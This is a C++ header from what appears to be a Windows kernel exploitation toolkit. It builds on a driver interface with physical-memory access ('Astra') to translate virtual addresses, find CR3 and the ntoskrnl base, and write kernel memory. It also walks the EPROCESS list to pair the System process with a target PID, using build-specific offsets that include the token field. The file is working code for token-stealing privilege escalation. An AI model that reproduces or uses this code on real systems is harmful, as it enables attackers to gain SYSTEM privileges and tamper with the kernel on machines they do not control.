#pragma once
// Kernel discovery + virtual-address R/W on top of astra::Astra.
//
// 4-level x86-64 page-table walker, CR3 finder, ntoskrnl base finder,
// EPROCESS walk.
// Copied from D:\Sandboxie\Astra64-RW\cpp\kernel.h (header-only, no changes).

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <algorithm>
#include <stdexcept>
#include <string>
#include <vector>
#include <Windows.h>

#include "astra.h"
#include "pe.h"

namespace kernel {

inline std::string to_hex(uint64_t v) {
    char buf[20];
    snprintf(buf, sizeof(buf), "%llX", (unsigned long long)v);
    return buf;
}

// --- Page table walk --------------------------------------------------------

inline bool virt_to_phys(const astra::Astra& drv, uint64_t cr3, uint64_t va, uint64_t& pa_out) {
    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pd_idx   = (va >> 21) & 0x1FF;
    uint64_t pt_idx   = (va >> 12) & 0x1FF;

    uint64_t pml4e;
    try { pml4e = drv.read_u64((cr3 & 0x000FFFFFFFFFF000ULL) + pml4_idx * 8); }
    catch (...) { return false; }
    if (!(pml4e & 1)) return false;

    uint64_t pdpte;
    try { pdpte = drv.read_u64((pml4e & 0x000FFFFFFFFFF000ULL) + pdpt_idx * 8); }
    catch (...) { return false; }
    if (!(pdpte & 1)) return false;
    if (pdpte & 0x80) {
        pa_out = (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
        return true;
    }

    uint64_t pde;
    try { pde = drv.read_u64((pdpte & 0x000FFFFFFFFFF000ULL) + pd_idx * 8); }
    catch (...) { return false; }
    if (!(pde & 1)) return false;
    if (pde & 0x80) {
        pa_out = (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
        return true;
    }

    uint64_t pte;
    try { pte = drv.read_u64((pde & 0x000FFFFFFFFFF000ULL) + pt_idx * 8); }
    catch (...) { return false; }
    if (!(pte & 1)) return false;
    pa_out = (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
    return true;
}

inline void vread(const astra::Astra& drv, uint64_t cr3, uint64_t va, void* buf, size_t len) {
    uint64_t pa;
    if (!virt_to_phys(drv, cr3, va, pa))
        throw std::runtime_error("virt_to_phys failed @ 0x" + to_hex(va));
    drv.read_phys(pa, buf, len);
}

inline uint32_t vread_u32(const astra::Astra& drv, uint64_t cr3, uint64_t va) {
    uint32_t v; vread(drv, cr3, va, &v, 4); return v;
}

inline uint64_t vread_u64(const astra::Astra& drv, uint64_t cr3, uint64_t va) {
    uint64_t v; vread(drv, cr3, va, &v, 8); return v;
}

inline void vwrite(const astra::Astra& drv, uint64_t cr3, uint64_t va, const void* buf, size_t len) {
    uint64_t cur = va;
    size_t pos = 0;
    while (pos < len) {
        size_t off   = static_cast<size_t>(cur & 0xFFF);
        size_t chunk = (std::min)(len - pos, size_t(0x1000) - off);
        uint64_t pa;
        if (!virt_to_phys(drv, cr3, cur, pa))
            throw std::runtime_error("vwrite vtop @ 0x" + to_hex(cur));
        drv.write_phys(pa, static_cast<const uint8_t*>(buf) + pos, chunk);
        pos += chunk;
        cur += chunk;
    }
}

// --- CR3 + ntoskrnl base ----------------------------------------------------

inline uint64_t find_cr3(const astra::Astra& drv) {
    uint64_t kusd_pml4_idx = (astra::KUSD_VA >> 39) & 0x1FF;

    std::vector<uint64_t> candidates;
    for (uint64_t phys_page = 0; phys_page < 0x4000000ULL; phys_page += 0x1000) {
        uint64_t pml4e;
        try { pml4e = drv.read_u64(phys_page + kusd_pml4_idx * 8); }
        catch (...) { continue; }
        if (!(pml4e & 1)) continue;
        uint64_t next_pa = pml4e & 0x000FFFFFFFFFF000ULL;
        if (next_pa > 0x800000000ULL) continue;
        candidates.push_back(phys_page);
    }

    for (auto cr3 : candidates) {
        uint64_t kusd_pa;
        if (!virt_to_phys(drv, cr3, astra::KUSD_VA, kusd_pa)) continue;
        try {
            uint32_t v = drv.read_u32(kusd_pa + 0x26C);
            if (v == 10) return cr3;
        } catch (...) { continue; }
    }
    throw std::runtime_error("CR3 not found");
}

inline uint64_t find_kernel_base(const astra::Astra& drv, uint64_t cr3, uint64_t lstar) {
    uint64_t start = lstar & ~0xFFFULL;
    for (uint64_t i = 0; i < 0x4000ULL; ++i) {
        uint64_t va = start - i * 0x1000;
        if (!astra::is_kptr(va)) break;
        uint64_t pa;
        if (!virt_to_phys(drv, cr3, va, pa)) continue;
        uint8_t hdr[0x200];
        try { drv.read_phys(pa, hdr, sizeof(hdr)); } catch (...) { continue; }
        if (hdr[0] != 'M' || hdr[1] != 'Z') continue;
        uint32_t lfn;
        memcpy(&lfn, hdr + 0x3C, 4);
        if (lfn + 0x54 > sizeof(hdr)) continue;
        if (memcmp(hdr + lfn, "PE\0\0", 4) != 0) continue;
        uint16_t machine;
        memcpy(&machine, hdr + lfn + 4, 2);
        if (machine != 0x8664) continue;
        uint16_t magic;
        memcpy(&magic, hdr + lfn + 24, 2);
        if (magic != 0x20B) continue;
        uint32_t size;
        memcpy(&size, hdr + lfn + 0x50, 4);
        if (size < 0x100000) continue;
        if (va + size <= lstar) continue;
        return va;
    }
    throw std::runtime_error("ntoskrnl base not found");
}

inline uint64_t find_module_base_walkback(const astra::Astra& drv, uint64_t cr3,
                                          uint64_t hint_va, uint64_t max_pages) {
    uint64_t start = hint_va & ~0xFFFULL;
    for (uint64_t i = 0; i < max_pages; ++i) {
        uint64_t va = start - i * 0x1000;
        if (!astra::is_kptr(va)) break;
        uint64_t pa;
        if (!virt_to_phys(drv, cr3, va, pa)) continue;
        uint8_t hdr[0x40];
        try { drv.read_phys(pa, hdr, sizeof(hdr)); } catch (...) { continue; }
        if (hdr[0] == 'M' && hdr[1] == 'Z') return va;
    }
    return 0; // not found
}

// --- EPROCESS walk ----------------------------------------------------------

struct EprocessOffsets {
    uint64_t pid;
    uint64_t links;
    uint64_t token;
    uint64_t image_name;
};

inline uint32_t get_build_number() {
    typedef LONG(WINAPI* RtlGetVersionFn)(PRTL_OSVERSIONINFOW);
    auto fn = reinterpret_cast<RtlGetVersionFn>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion"));
    if (!fn) throw std::runtime_error("RtlGetVersion not found");
    RTL_OSVERSIONINFOW info{};
    info.dwOSVersionInfoSize = sizeof(info);
    if (fn(&info) != 0) throw std::runtime_error("RtlGetVersion failed");
    return info.dwBuildNumber;
}

inline EprocessOffsets detect_eprocess_offsets() {
    uint32_t build = get_build_number();
    if (build >= 26100)
        return { 0x1D0, 0x1D8, 0x248, 0x338 };
    if (build >= 22000)
        return { 0x440, 0x448, 0x4B8, 0x5A8 };
    if (build >= 19041)
        return { 0x440, 0x448, 0x4B8, 0x5A8 };
    throw std::runtime_error("unsupported build " + std::to_string(build));
}

struct EprocessPair {
    uint64_t system_eproc;
    uint64_t target_eproc;
};

inline EprocessPair find_eprocess_by_ptwalk(
    const astra::Astra& drv, uint64_t cr3, uint64_t nt_kbase, uint32_t target_pid)
{
    auto offsets = detect_eprocess_offsets();

    auto nt = pe::load_image("ntoskrnl.exe");
    uint64_t psisp_rva = pe::export_rva(nt.base, "PsInitialSystemProcess");
    if (!psisp_rva) throw std::runtime_error("PsInitialSystemProcess not exported");
    uint64_t psisp_va = nt_kbase + psisp_rva;
    uint64_t sys_va = vread_u64(drv, cr3, psisp_va);
    if (!astra::is_kptr(sys_va)) {
        char msg[128];
        snprintf(msg, sizeof(msg), "PsInitialSystemProcess = 0x%llX - not a kernel pointer",
                 (unsigned long long)sys_va);
        throw std::runtime_error(msg);
    }

    uint64_t sys_pid = vread_u64(drv, cr3, sys_va + offsets.pid);
    if (sys_pid != 4)
        throw std::runtime_error("System EPROCESS PID = " + std::to_string(sys_pid));
    if (target_pid == 4)
        return { sys_va, sys_va };

    uint64_t head_va = vread_u64(drv, cr3, sys_va + offsets.links + 8);
    if (!astra::is_kptr(head_va)) throw std::runtime_error("PsActiveProcessHead invalid");
    uint64_t head_flink = vread_u64(drv, cr3, head_va);

    uint64_t cur = head_flink;
    for (int i = 0; i < 4096; ++i) {
        if (cur == head_va) break;
        uint64_t ep = cur - offsets.links;
        try {
            uint64_t pid = vread_u64(drv, cr3, ep + offsets.pid);
            if (static_cast<uint32_t>(pid) == target_pid)
                return { sys_va, ep };
        } catch (...) {}
        try {
            uint64_t next = vread_u64(drv, cr3, cur);
            if (!astra::is_kptr(next)) break;
            cur = next;
        } catch (...) { break; }
    }
    throw std::runtime_error("PID " + std::to_string(target_pid) + " not found in EPROCESS list");
}

} // namespace kernel
